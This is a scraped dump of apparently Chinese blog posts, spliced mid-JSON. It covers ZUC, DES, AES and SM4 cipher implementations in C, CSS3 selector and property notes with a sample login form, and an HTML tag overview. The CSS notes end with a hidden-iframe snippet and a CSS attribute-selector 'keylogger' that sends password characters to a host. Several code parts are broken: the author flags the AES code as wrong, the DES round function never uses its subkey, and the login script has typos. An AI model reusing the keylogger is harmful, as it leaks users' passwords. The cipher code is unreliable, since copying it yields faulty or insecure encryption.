密钥 128bit; IBS 输入比特流(明文或密文).\n密钥装入: 128bit扩展为16个31bit, $k=k_0|k_1|\u0026hellip;|k_{15}$, $v=v_0|v_1|\u0026hellip;|v_{15}$; 其中 $iv_0={\\rm COUNT}[0]$, $iv_1={\\rm COUNT}[1]$, $iv_2={\\rm COUNT}[2]$, $iv_3={\\rm COUNT}[3]$, $iv_4={\\rm BEARER}|{\\rm DIRECTION}|00$, $iv_5=iv_6=iv_7=00000000$, $iv_{j+8}=iv_j$, $j=8,9,\u0026hellip;,15$.\n1 2 3 4 5 6 for (int i = 0; i \u0026lt; 16; ++i) { key[i] = (((k[2*i] \u0026lt;= \u0026#39;9\u0026#39;) ? (k[2*i]-\u0026#39;0\u0026#39;) : (k[2*i]-\u0026#39;a\u0026#39;+10))\u0026lt;\u0026lt;4) +((k[2*i+1] \u0026lt;= \u0026#39;9\u0026#39;) ? (k[2*i+1]-\u0026#39;0\u0026#39;) : (k[2*i+1]-\u0026#39;a\u0026#39;+10)); iv[i] = (((v[2*i] \u0026lt;= \u0026#39;9\u0026#39;) ? (v[2*i]-\u0026#39;0\u0026#39;) : (v[2*i]-\u0026#39;a\u0026#39;+10))\u0026lt;\u0026lt;4) +((v[2*i+1] \u0026lt;= \u0026#39;9\u0026#39;) ? (v[2*i+1]-\u0026#39;0\u0026#39;) : (v[2*i+1]-\u0026#39;a\u0026#39;+10)); } LSFR: 连接多项式为 $GF(2^{31}-1)$ 上本原多项式 $g(x)=x^{16}-2^{15}x^{15}-2^{17}x^{13}-2^{21}x^{10}-2^{20}x^{4}-2^8-1$; 输出 $m$ 序列周期 $T=(2^{31}-1)^{16}-1$; 生成16个31bit LFSR块. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 void LFSRInitMode(uint32 u){ uint32 v = 0, tmp = 0; v = LFSR[0]; tmp = mod2ExpMulti(LFSR[0],8); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[4],20); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[10],21); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[13],17); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[15],15); v = modAdd(v,tmp); v = modAdd(v,u); if (v == 0){ v = 0x7fffffff; } for (int i = 0; i \u0026lt; 16; ++i) { LFSR[i] = LFSR[i+1]; } LFSR[15] = v; } void LFSRWorkMode(){ uint32 v = 0, tmp = 0; v = LFSR[0]; tmp = mod2ExpMulti(LFSR[0],8); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[4],20); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[10],21); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[13],17); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[15],15); v = modAdd(v,tmp); if (v == 0){ v = 0x7fffffff; } for (int i = 0; i \u0026lt; 16; ++i) { LFSR[i] = LFSR[i+1]; } LFSR[15] = v; } Bit重组: $X_0=S[15]_H|S[14]_L$, $X_1=S[11]_L|S[9]_H$ ,$X_2=S[7]_L|S[5]_H$, $X_3=S[2]_L|S[0]_H$. 1 2 3 4 5 6 void bitRecons(){ X[0] = ((LFSR[15]\u0026amp;0x7fff8000)\u0026lt;\u0026lt;1)|(LFSR[14]\u0026amp;0x0000ffff); X[1] = (LFSR[11]\u0026lt;\u0026lt;16)|(LFSR[9]\u0026gt;\u0026gt;15); X[2] = (LFSR[7]\u0026lt;\u0026lt;16)|(LFSR[5]\u0026gt;\u0026gt;15); X[3] = (LFSR[2]\u0026lt;\u0026lt;16)|(LFSR[0]\u0026gt;\u0026gt;15); } 非线性F函数: $W=(X_0\\oplus R_1)\\boxplus R_2$, $W_1=R_1\\boxplus X_1$, $W_2=R_2\\boxplus X_2$, $R_1=S(L_1(W_{1L}|W_{2H}))$, $R_2=S(L_2(W_{2L}|W_{1H}))$; 其中 $L_1(a)=a\\oplus(a\u0026lt; \u0026lt;_o 2)\\oplus(a\u0026lt; \u0026lt;_o 10)\\oplus(a\u0026lt; \u0026lt;_o 18)\\oplus(a\u0026lt; \u0026lt;_o 24)$, $L_2(a)=a\\oplus(a\u0026lt; \u0026lt;_o 8)\\oplus(a\u0026lt; \u0026lt;_o 14)\\oplus(a\u0026lt; \u0026lt;_o 22)\\oplus(a\u0026lt; \u0026lt;_o 30)$; $S$ 盒为 $(S_0,S_1,S_0,S_1)$, 每8bit作为索引, 返回 $S$ 盒中对应的8bit数值. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 void F(){ uint32 W1 = 0,W2 = 0; W = (X[0]^R1)+R2; W1 = R1+X[1]; W2 = R2+X[2]; R1 = S(L1((W1\u0026lt;\u0026lt;16)|(W2\u0026gt;\u0026gt;16))); R2 = S(L2((W1\u0026gt;\u0026gt;16)|(W2\u0026lt;\u0026lt;16))); } uint32 L1(uint32 x){ return x^rot(x,2)^rot(x,10)^rot(x,18)^rot(x,24); } uint32 L2(uint32 x){ return x^rot(x,8)^rot(x,14)^rot(x,22)^rot(x,30); } uint32 S(uint32 a){ uint8 x[4] = {0}, y[4] = {0}; x[0] = a\u0026gt;\u0026gt;24; x[1] = (a\u0026gt;\u0026gt;16)\u0026amp;0xff; x[2] = (a\u0026gt;\u0026gt;8)\u0026amp;0xff; x[3] = a \u0026amp; 0xff; for (int i = 0; i \u0026lt; 4; ++i) { if (i == 0 || i == 2){ y[i] = S0[x[i]]; } else { y[i] = S1[x[i]]; } } return (y[0]\u0026lt;\u0026lt;24)|(y[1]\u0026lt;\u0026lt;16)|(y[2]\u0026lt;\u0026lt;8)|y[3]; } 密钥流输出: $K=W\\oplus X[3]$, 每个时钟节拍产生32bit密钥流.\n输出参数: OBS 输出比特流(密文或明文).\nZUC生成密钥流分为5个阶段: $ck$ 和 $iv$ 装载到LFSR; 寄存器 $R_1,R_2$ 置空; 初始化模式运行32次; 工作模式运行1次并舍弃输出; 持续工作模式产生密钥流.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // 1. 装载LFSR void keyIVInsert(uint8 *k, uint8 *iv){ for (int i = 0; i \u0026lt; 16; ++i) { LFSR[i] = (k[i]\u0026lt;\u0026lt;23)|(D[i]\u0026lt;\u0026lt;8)|iv[i]; } } // 2. 置空寄存器 uint32 R1 = 0, R2 = 0; // 3. 初始化模式运行32次 void init(uint8 *k, uint8 *iv){ keyIVInsert(k,iv); R1 = 0; R2 = 0; for (int i = 0; i \u0026lt; 32; ++i) { bitRecons(); F(); LFSRInitMode(W\u0026gt;\u0026gt;1); } } uint32 *keyStreamGenerate(unsigned long keyLen){ uint32 *keyStream = (uint32 *)malloc(keyLen*sizeof(uint32)); // 4. 工作模式运行1次并舍弃输出 bitRecons(); F(); LFSRWorkMode(); // 5. 持续工作模式产生密钥流 for (unsigned long i = 0; i \u0026lt; keyLen; ++i) { bitRecons(); F(); keyStream[i] = W^X[3]; LFSRWorkMode(); } return keyStream; } 安全问题: 能够抵御多种已知针对序列密码的攻击, 主要威胁是侧信道攻击.\n分组密码 本质为单表代换, 复杂多轮非线性, 通过混淆和扩散实现. 组件: S盒(混淆扩散), P置换(扩散), 轮函数F, 密钥扩展.\n结构模型\nS-P网络: 每轮异或密钥后, S盒分组小块混淆扩散, P置换整体扩散, $N_i=F(N_{i-1}\\oplus K_i)$. Feistel网络: 分为左右两部分, $R_i=F(R_{i-1},K_i)\\oplus L_{i-1}$, $L_i=R_{i-1}$, 最后一轮不做对换; 同个算法实现加解密. 工作模式:\nECB(电子密码本): 分组用相同密钥加密; 相同明文产生相同密文; 可并行. CBC(密码分组链接): 初始化 $iv$ 得到第一组密文, 第一组密文与第二组明文异或后再加密; TSL及IPSEc协议推荐; 仅解密支持并行. CFB(密文反馈): 初始化 $iv$ 得到密文 $E$, $vi$ 左移 $n$ 位, 密文 $E$ 与明文异或后得到密文 $C$, $C$ 高位 $n$ 位填入 $vi$; 流式数据, 错误有界; 仅解密支持并行. OFB(输出反馈): 初始化 $iv$ 得到密文 $E$, $vi$ 左移 $n$ 位, 密文 $E$ 与高位 $n$ 位填入 $vi$, 密文 $E$ 与明文异或后得到密文 $C$; 流式数据, 错误有界; 不支持并行. CTR(计数器): 自增算子加密后与明文异或得到密文; 相当于一次一密; 简单快速安全可并行. DES 数据加密标准(Data Encryption Standard), 体现Shannon密码设计思想, 公开密码算法先例, 16轮Feistel网络对合加解密.\n密钥扩展: 初始密钥(64bit)经PC1表置换得到 $C_i$ 和 $D_i$ (各28bit), 循环左移 $ls_i$ 位, 经PC2表置换得到第 $i$ 轮子密钥 $K_i$ (48bit); 置换表中元素 $pt_{i}$ 意为将待置换中的第 $pt_{i}$ 位置换到第$i$位. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 void tablePermute(bit1 *permuted, bit1 *origin, bit8 *table, bit8 size){ bit1 tmp[64] = {0}; for (int i = 0; i \u0026lt; size; ++i) { tmp[i] = origin[table[i]-1]; } bitCopy(permuted,tmp,size); } void keyExp(bit8 *key){ bit1 keyPerRound[64] = {0}; bit1 *keyPrL = \u0026amp;keyPerRound[0]; bit1 *keyPrR = \u0026amp;keyPerRound[28]; byteToBit(keyPerRound,key,8); tablePermute(keyPerRound,keyPerRound,PC1,56); for (int i = 0; i \u0026lt; 16; ++i) { bitRot(keyPrL,28,LS[i]); bitRot(keyPrR,28,LS[i]); tablePermute(subKey[i],keyPerRound,PC2,48); } } 初始置换与结束逆置换: 明(密)文(64bit)经IP表置换进入加密, 完成加(解)密后经IPR表置换得到密(明)文(64bit).\n轮函数: 32bit输入经E表置换扩充到48bit, 与子密钥(48bit)异或后, 经S盒压缩回32bit(混淆), 再经P表置换得到32bit输出(扩散); S盒6位输入 $b_1b_2b_3b_4b_5b_6$, 输出$s_{b_1b_6, b_2b_3b_4b_5}$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 void SPermute(bit1 *permuted, bit1 *origin){ int row, col; bit1 *p1 = origin; bit1 *p2 = permuted; for (int i = 0; i \u0026lt; 8; ++i) { row = 2 * p1[0] + p1[5]; col = 8 * p1[1] + 4 * p1[2] + 2 * p1[3] + p1[4]; byteToBit(permuted,\u0026amp;S[i][row][col],4); p1 += 6; p2 += 4; } } void F(bit1 *output, bit1 *input){ bit1 tmp[48] = {0}; tablePermute(tmp,input,E,48); bitXor(tmp,input,48); SPermute(output,tmp); tablePermute(output,output,P,32); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 加密 tablePermute(textBit,textBit,IP,64); for (int i = 0; i \u0026lt;= 15; ++i) { bitCopy(tmp,textBitR,32); F(textBitR,subKey[i]); bitXor(textBitR,textBitL,32); bitCopy(textBitL,tmp,32); } tablePermute(textBit,textBit,IPR,64); // 解密, 密钥顺序相反 tablePermute(textBit,textBit,IP,64); for (int i = 15; i \u0026gt;= 0; --i) { bitCopy(tmp,textBitL,32); F(textBitL,subKey[i]); bitXor(textBitL,textBitR,32); bitCopy(textBitR,tmp,32); } tablePermute(textBit,textBit,IPR,64); S盒是DES中唯一非线性变换, 设计准则: 改变1bit输入至少2bit发生变化; $S(x)$ 和 $S(x\\oplus 001100)$ 至少2bit发生变化; $S(x)\\neq S(x\\oplus 11ef00)$, $e,f\\in{0,1}$; 改变5bit输入, 输出的0和1数目大致相等; 足够的非线性度以抵抗线性攻击; 差分性均匀以抵抗差分攻击; 足够的代数次数和项目以抵抗插值攻击和高阶差分攻击.\n攻击类型: 穷钥攻击; 侧信道攻击(能量分析, 故障注入分析); 差分攻击; 线性攻击.\n安全问题: 密钥太短(有效仅56bit); 存在弱密钥; 互补对称性(异或运算).\n3-DES: 112(1和3轮密钥相同)/256bit密钥; 加解密速度慢.\nAES (something wrong in the AES code)\n高级数据加密标准(Advanced Encryption Standard), 采用10/12/14轮S-P网络非对合加解密(对应128/192/256bit密钥).\n$GF(2)$ 上多项式域 $GF(2^8)$ 中元素为 $b_{(8)}=b_7x^7+b_6x^6+b_5x^5+b_4x^4+b_3x^3+b_2x^2+b_1x+b_0$, 乘法需对既约多项式 $m(x)=x^8+x^4+x^3+x+1$ 取模, 乘法逆元可由扩展Euclid算法得到. 考虑 $xb_{(8)}=(b_{(8)}\u0026lt; \u0026lt; 1)\\oplus m(x)$, 高次乘法可重复 $x$ 乘实现.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 uint8 modMulti(uint8 x, uint8 y){ uint8 ans = 0, tmp; for (int i = 0; i \u0026lt; 8; ++i) { if (x\u0026amp;0x01){ ans ^= y; } tmp = y\u0026amp;0x80; y \u0026lt;\u0026lt;= 1; if (tmp){ y ^= 0x1B; } x \u0026gt;\u0026gt;= 1; } return ans; } $GF(2^8)$ 上 $degf\\leq 3$ 多项式环 $GF(2^8)[x^4+1]$ 中元素为 $b_{(32)}=B_3x^3+B_2x^2+B_1x+B_0$, 乘法需对 $x^4+1$ 取模. 考虑 $xb_{(32)}=b_{(32)}\u0026gt; \u0026gt;8$, 高次乘法可视为 $GF(2^8)$ 上矩阵乘法.\n状态矩阵: 128bit明(密)文和密钥按列优先载入4阶方阵, 每列32bit称为\u0026quot;字\u0026quot;, 加(解)密后按列优先输出密(明)文. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void loadState(uint8 state[4][4], uint8* text){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[j][i] = *(text++); } } } void storeState(uint8* text, uint8 state[4][4]){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { *(text++) = state[j][i]; } } } 密钥扩展: 4字输入, 扩展为44字输出; $w[i]=w[i-1]\\oplus w[i-4]$, $i\\% 4 \\ne 0$; $w[i]=w[i-4]\\oplus S(w\u0026rsquo;[i-1])\\oplus Rcon[i]$, $i \\% 4 = 0$, 即每个字循环左移1字节后进行S盒置换. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 uint32 mixRoll(uint32 x){ uint32 sub1 = S[(x\u0026gt;\u0026gt;24)\u0026amp;0xff]\u0026lt;\u0026lt;24; uint32 sub2 = S[(x\u0026gt;\u0026gt;16)\u0026amp;0xff]\u0026lt;\u0026lt;16; uint32 sub3 = S[(x\u0026amp;0xff)\u0026gt;\u0026gt;8]\u0026lt;\u0026lt;8; uint32 sub4 = S[x\u0026amp;0xff]; return (sub1\u0026amp;0xff000000)^(sub2\u0026amp;0xff0000)^(sub3\u0026amp;0xff00)^(sub4\u0026amp;0xff); } void keyExp(uint8* key){ int m; for (int i = 0; i \u0026lt; 4; ++i) { load(\u0026amp;w[i],key+4*i); } for (int i = 0; i \u0026lt; 10; ++i) { m = 4*i; w[4+m] = w[m]^ mixRol1(w[3+m])^rotConst[i]; w[5+m] = w[1+m]^w[4+m]; w[6+m] = w[2+m]^w[5+m]; w[7+m] = w[3+m]^w[6+m]; } } 轮函数: 主要包括(逆)字节代换, (逆)行位移, (逆)列混合, 轮密钥加(即子密钥异或). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // 加密, 字节代换, 行位移, 列混合, 轮密钥加, 最后一轮跳过列混合 loadState(state, pPlain); addRoundKey(state,pW); for (int j = 0; j \u0026lt; 10; ++j) { pW += 4; subBytes(state); shiftRows(state); mixCols(state); addRoundKey(state,pW); } subBytes(state); shiftRows(state); addRoundKey(state,pW+4); storeState(pCipher,state); // 解密, 密钥顺序相反, 逆行位移, 逆字节代换, 轮密钥加, 逆列混合, 最后一轮跳过逆列混合 loadState(state, pCipher); addRoundKey(state,pW); for (int j = 0; j \u0026lt; 10; ++j) { pW -= 4; shiftRowsInv(state); subBytesInv(state); addRoundKey(state,pW); mixColsInv(state); } shiftRowsInv(state); subBytesInv(state); addRoundKey(state,pW-4); storeState(pPlain,state); 字节代换即取求每个字节在 $GF(2^8)$ 上的逆后进行仿射变换, 可等效为S盒置换; 逆字节代换即逆仿射变换再取逆, 可等效为逆S盒置换.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void subBytes(uint8 state[4][4]){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = S[state[i][j]]; } } } void subBytesInv(uint8 state[4][4]){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = SInv[state[i][j]]; } } } 行位移即第 $i=0,1,2,3$ 个字循环右移 $i$ 字节; 逆行位移即第 $i$ 个字循环左移 $i$ 字节.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 uint32 rol(uint32 x, uint8 n){ return (x\u0026lt;\u0026lt;n)|(x\u0026gt;\u0026gt;(32-n)); } uint32 ror(uint32 x, uint8 n){ return (x\u0026gt;\u0026gt;n)|(x\u0026lt;\u0026lt;(32-n)); } void shiftRows(uint8 state[4][4]){ uint32 tmp[4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { load(\u0026amp;tmp[i],state[i]); tmp[i] = rol(tmp[i],8*i); store(state[i],\u0026amp;tmp[i]); } } void shiftRowsInv(uint8 state[4][4]){ uint32 tmp[4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { load(\u0026amp;tmp[i],state[i]); tmp[i] = ror(tmp[i],8*i); store(state[i],\u0026amp;tmp[i]); } } 列混合即按列的字在 $GF(2^8)[x^4+1]$ 上与 $a(x)={\\rm 0x03}x^3+{\\rm 0x01}x^2+{\\rm 0x01}x+{\\rm 0x02}$ 相乘; 逆列混合即与 $a^{-1}(x)={\\rm 0x0B}x^3+{\\rm 0x0D}x^2+{\\rm 0x09}x+{\\rm 0x0E}$ 相乘; 均可等效为 $GF(2^8)$ 上的矩阵乘法.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 void mixCols(uint8 state[4][4]){ uint8 tmp[4][4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { tmp[i][j] = state[i][j]; } } for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = modMulti(D[i][0],tmp[0][j]) ^ modMulti(D[i][1],tmp[1][j]) ^ modMulti(D[i][2],tmp[2][j]) ^ modMulti(D[i][3],tmp[3][j]); } } } void mixColsInv(uint8 state[4][4]){ uint8 tmp[4][4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { tmp[i][j] = state[i][j]; } } for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = modMulti(DInv[i][0],tmp[0][j]) ^ modMulti(DInv[i][1],tmp[1][j]) ^ modMulti(DInv[i][2],tmp[2][j]) ^ modMulti(DInv[i][3],tmp[3][j]); } } } 安全问题: 能够抵御多种已知针对分组密码的攻击, 主要威胁是侧信道攻击.\nSM4 128bit密钥32轮非平衡Feistel网络. 1字$=$4字节$=$32bit.\n密钥扩展: 初始密钥 $(MK_0,MK_1,MK_2,MK_3)$, $K_i=MK_i\\oplus FK_i$ ,$rk_i = K_{i+4} = K_i\\oplus T(K_{i+1}\\oplus K_{i+2}\\oplus K_{i+3}\\oplus CK_i)$; FK_i 为系统参数, CK_i 为固定参数; 以每个字节前4bit作为行, 后4bit作为列, 进行非线性的S盒置换; 再对字进行线性变换 $B\\oplus (B \u0026lt; \u0026lt;_o 13)\\oplus (B \u0026lt; \u0026lt;_o 23)$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 uint32 TKey(uint32 k){ int sk = SPermute(k); return sk^rot(sk,13)^rot(sk,23); } void generateRk(void){ uint32 K[35]; for (int i = 0; i \u0026lt; 4; ++i) { K[i] = MK[i]^FK[i]; } for (int i = 0; i \u0026lt; 32; ++i) { K[(i+4)%4] = K[i%4]^TKey(K[(i+1)%4]^K[(i+2)%4]^K[(i+3)%4]^CK[i]); rk[i] = K[(i+4)%4]; } } 轮函数: $X_{i+4} = X_i\\oplus T\u0026rsquo;(X_{i+1}\\oplus X_{i+2}\\oplus X_{i+3}\\oplus rK_i)$; 进行非线性的S盒置换后, 再对字进行线性变换 $B\\oplus (B \u0026lt; \u0026lt;_o 2)\\oplus (B \u0026lt; \u0026lt;_o 10)\\oplus (B \u0026lt; \u0026lt;_o 18)\\oplus (B \u0026lt; \u0026lt;_o 24)$.\n反序输出: 输入 $(X_1,X_2,X_3,X_4)$, 输出 $(Y_1,Y_2,Y_3,Y_4)=(X_{35},X_{34},X_{33},X_{32})$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 uint32 T(uint32 x){ int sx = SPermute(x); return sx^rot(sx,2)^rot(sx,10)^rot(sx,18)^rot(sx,24); } void F32(void){ for (int i = 0; i \u0026lt; 32; ++i) { X[(i+4)%4] = X[i%4]^T(X[(i+1)%4]^X[(i+2)%4]^X[(i+3)%4]^rk[i]); } for (int i = 0; i \u0026lt; 4; ++i) { Y[i] = X[3-i]; } } ","date":"2023-09-04T00:00:00Z","permalink":"https://example.com/p/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/","title":"对称加密"},{"content":"Cascading Style Sheets\n基本结构 1 selector, ... {property:value; ... } 继承: Netscape4不支持 格式化: 块级元素, 行内元素\n多重样式 更详细定义 - 继承 重复定义 - 优先级: 同级别下权重大, 同权重下后定义 !important 1-0-0-0-0 内联 1-0-0-0 1 \u0026lt;tag style=\u0026#34;property:value;...\u0026#34;\u0026gt; id选择器 1-0-0 1 #id {property:value; ... } class选择器 0-1-0 1 .class {property:value; ... } property选择器 0-1-0 1 [property=\u0026#34;value\u0026#34;] {property:value; ... } ~= 包含值(完整) |= 以值开头(完整) ^= 匹配以值开头 $= 匹配以值结尾 *= 匹配值\n伪类(pseudo class) 0-1-0 1 :pseudo_class {property:value; ... } active, checked, disabled, empty, enabled, first-child, first-of-type, focus, hover, in-range, invalid, lang, last-child, last-of-type, link, nth-child(n), nth-last-child(n), nth-last-of-type(n), nth-of-type(n), only-of-type, only-child, option, out-of-range, read-only, read-write, required, root, target, valid, visited\ntag选择器 0-0-1 1 tag {property:value; ... } 伪元素(pseudo element) 0-0-1 1 ::pseudo_element {property:value; ... } after, before, first-letter, first-line, selection\n通配符* 关系符, + \u0026gt; ~ \u0026quot;\u0026quot; | | 否定符:not( ) 0-0-0 分组 tag,tag 共同样式 后代 tag tag 包含元素 父子 tag\u0026gt;tag 仅限子元素 相邻 tag+tag 仅对紧邻元素 外部链接 1 2 3 \u0026lt;head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;文件名.css\u0026#34;\u0026gt; \u0026lt;\\head\u0026gt; 常用属性 背景: background, -attachment (scroll; fixed; local; initial; inherit), -color, -image, -position, -repeat, -clip, -origin (padding-box; border-box; content-box), -size 字体: @font-face (font-family; src); font, -family, -size, -style (normal; italic; oblique), -variant (normal; small-caps), -weight 文本: color, direction (ltr; rtl), letter-space, line-height, vertical-align, white-space; text-align (left; right; center; justify), -decoration (none; underline; overline; line-through; blink), -indent, -transform (none; capitalize; uppercase; lowercase), -overflow (clip; ellipsis; string), -shadow; word-spacing, -break (normal; break-all; keep-all), -wrap 分页: page-break-after, -before, -inside (auto; always; avoid; left; right) 定位: position (absolute; fixed; relative; static; sticky), bottom, left, right, top, clear (left; right; both; none), clip (shape; auto), cursor (url; default; auto; crosshair; pointer; move; text; wait; help; \u0026hellip;), display (absolute; fixed; relative; static; sticky), float (left; right; none), overflow (visible; hidden; scroll; auto), visibility (visible; hidden; collapse), z-index 网络: grid-column, grid-row Box: box, -shadow, -sizing; overflow, -x/y (no-display; no-content); opacity 外边距: margin, -left/right/top/bottom 轮廓: outline, -color/style/width 边框: border, -left/right/top/bottom, - -color/style/width, -radius 内边距: padding, -left/right/top/bottom 内容: height/width, max/min-height/width 弹性: flex, -grow, -shrink, -basis, -flow, -direction; align, -content, -items (stretch; center; flex-start; flex-end; baseline), -self (space-between; space-evenly; space-around); justify-content, order 列表: list-style, -image, -position (outside; inside), -type (none; disc; circle; squre; decimal; lower-roman; upper-alpha; \u0026hellip;) 多列: columns, conlumn-count, -fill, -gap, -span, -width, -rule, - -color/style/width 表格: border-collapse, -spacing, caption-side, empty-cells, table-layout 生成: content (none; normal; counter; attr; string; open-quote; close-quote; no-open-quote; no-close-quote; url), -increment, -reset; quotes 动画: @keyframes; animation, -name, -duration, -timing-funcion, -delay, -iteration-count, -direction, -play-state 过渡: transition, -property, -duration, -timing-function, -delay 实例: 简单表单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;登录界面\u0026lt;\\title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;login.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;用户登录\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;loginForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;username\u0026#34; placeholder=\u0026#34;用户名\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;密码\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;登录\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p id=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script src=\u0026#34;login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 body { font-family: Arial, sans-serif; } .container { width: 300px; margin: 0 auto; margin-top: 100px; } h1 { text-align: center; } form { margin-top: 30px; } input[type=text] input[type=password] input[type=submit] { display: block; width: 100% padding: 10px margin-bottom: 10xp; } button[type=submit] { background-color: #4CAF50; color: white; } #message { text-align: center; margin-top: 15px; font-weight: bold; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 document.getElementById(\u0026#39;loginForm\u0026#39;).addEventListerner(\u0026#39;submit\u0026#39;, function(e) { e.preventDefault(); var username = document.getElementById(\u0026#39;username\u0026#39;).value; var password = document.getElementById(\u0026#39;password\u0026#39;).value; var data = { username: username, password: password }; fetch(\u0026#39;/login\u0026#39;, { method: \u0026#39;PUT\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify(data) }) .then(function(response) { return responce.text(); }) .then(function(message) { document.getElementById(\u0026#39;message\u0026#39;).textContent = message; }) .catch(function(error) { console.log(error); }) }); 潜在漏洞 iframe transparent 1 \u0026lt;iframe src=\u0026#34;URL\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; keylogger 1 2 3 4 5 \u0026lt;style\u0026gt; input[type=\u0026#34;password\u0026#34;][value$=\u0026#34;a\u0026#34;] { backgroud-image: url(\u0026#34;http//localhost:3000/a\u0026#34;); } \u0026lt;/style\u0026gt; ","date":"2023-08-25T00:00:00Z","permalink":"https://example.com/p/css3/","title":"CSS3"},{"content":"HyperText Markup Language\n基本结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!doctype html\u0026gt; \u0026lt;!-- 声明为html5文件 --\u0026gt; \u0026lt;html\u0026gt; \u0026lt;!-- html内容 --\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- 头部元素: 标题, 元数据, 脚本, 样式， icon, 关系 --\u0026gt; \u0026lt;title\u0026gt; \u0026lt;!-- html5中标题必需 --\u0026gt; \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- 可见页面内容: 段落, 表单, 链接, 格式, 样式, 程序, 列表, 表格, 框架, 多媒体--\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 元素(element): 1 \u0026lt;begin_tag property=\u0026#34;value\u0026#34;; ...\u0026gt; content \u0026lt;/end_tag\u0026gt; 空元素(empty) 1 \u0026lt;tag property=\u0026#34;value\u0026#34;; ... /\u0026gt; 小写文件名, 完整后缀.html 常用标签 基础: !DOCTYPE, html, head, title, body, h1, \u0026hellip;, h6, p, br, hr, !\u0026ndash;\u0026hellip;\u0026ndash; 格式: abbr, b, cite, code, del, i, q, s, small, sup, sub, template, time, u, var, wbr 表单: form, input, textarea, button, select, optgroup, option, label, fieldset, legend, datalist, output 框架: iframe 图像: img, map, area, canvas, figcaption, figure, svg 音视频: audio, source, video 链接: a, link 列表: ul, ol, li, dt, dd 表格: table, caption, th, tr, td, thead, tbody, tfoot, col, colgroup 语义: style, div, span, header, nav, section, article, aside, footer,details, dialog, summary 元信息: base, meta 